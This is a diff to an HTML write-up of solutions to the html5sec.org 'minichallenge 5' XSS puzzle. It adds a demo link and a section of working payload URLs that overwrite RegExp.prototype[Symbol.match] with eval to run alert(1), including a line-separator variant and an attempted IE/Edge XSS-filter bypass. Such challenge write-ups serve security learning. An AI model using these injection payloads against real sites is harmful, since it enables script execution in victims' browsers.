@@ -263,7 +263,8 @@ w.location = xss + "#https://cure53.de/\\";</code></pre>
 
         <section>
             <h3>Idea 3.5</h3>
-            <p>Real working code &ndash; with timeouts and stuff</p>
+          <p>Real working code &ndash; with timeouts and stuff</p>
+          <a href="exploit1.html">Demo (must allow popups)</a>
             <pre><code>&lt;script&gt;
 var xss = "self[[typeof [[[d=self.w][w=self.u]][self[self.u]=eval]][Array.prototype.valueOf=URL]][0][2]]",
 hashes = [
@@ -312,6 +313,26 @@ step();
             <div>&nbsp;</div>
             <h3>Thanks</h3>
         </section>
+
+      <section>
+        <div>Simple Symbol.match</div>
+        <a
+          href="https://html5sec.org/minichallenges/5?xss=RegExp.prototype[Symbol.match]=eval#alert(1)"
+          target="_blank"
+        >https://html5sec.org/minichallenges/5?xss=RegExp.prototype[Symbol.match]=eval#alert(1)</a>
+        <div>utf8 LINE SEPARATOR</div>
+        <a
+          href="https://html5sec.org/minichallenges/5?xss=RegExp.prototype[Symbol.match]=eval#https://cure53.de/=1&#x2028;alert(1)"
+          target="_blank"
+        >https://html5sec.org/minichallenges/5?xss=RegExp.prototype[Symbol.match]=eval#https://cure53.de/=1&#x2028;alert(1)</a>
+        <div>IE and Edge XSS protection (didn't work for me)</div>
+        <a
+          href="https://html5sec.org/minichallenges/5?xss=slice=alert&quot;++++++++++++++++++++++++++++++hash.slice++++++++++++++++++++++++++="
+          target="_blank"
+        >https://html5sec.org/minichallenges/5?xss=slice=alert&&quot;++++++++++++++++++++++++++++++hash.slice++++++++++++++++++++++++++=</a>
+      </section>
+
+
     </div>
 </div>
 
